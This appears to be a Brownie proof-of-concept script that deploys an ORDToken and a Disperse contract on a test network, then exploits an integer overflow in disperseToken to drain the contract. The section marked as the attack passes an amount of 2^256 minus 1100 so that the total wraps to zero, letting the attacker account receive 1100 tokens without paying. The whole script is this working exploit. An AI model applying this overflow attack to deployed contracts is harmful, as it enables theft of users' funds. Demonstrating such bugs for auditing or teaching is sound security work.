from brownie import ORDToken, Disperse, accounts, network


def main():
    owner = accounts[0]
    attacker = accounts[3]

    token = ORDToken.deploy({"from": owner})
    disperse = Disperse.deploy({"from": owner})
    token.approve(disperse, 1100, {"from": owner})
    disperse.disperseToken(token, [disperse], [1100], {"from": owner})

    print (token.balanceOf(disperse))

    breakpoint()

    # Attack
    print(f"[+] Attacker balance {token.balanceOf(attacker)}")
    disperse.disperseToken(token,
                           [attacker, "0x0000000000000000000000000000000000000000"],
                           [1100, 115792089237316195423570985008687907853269984665640564039457584007913129638835 + 1],
                           {"from": attacker})

    print(f"[+] Attacker balance {token.balanceOf(attacker)}")
    network.disconnect()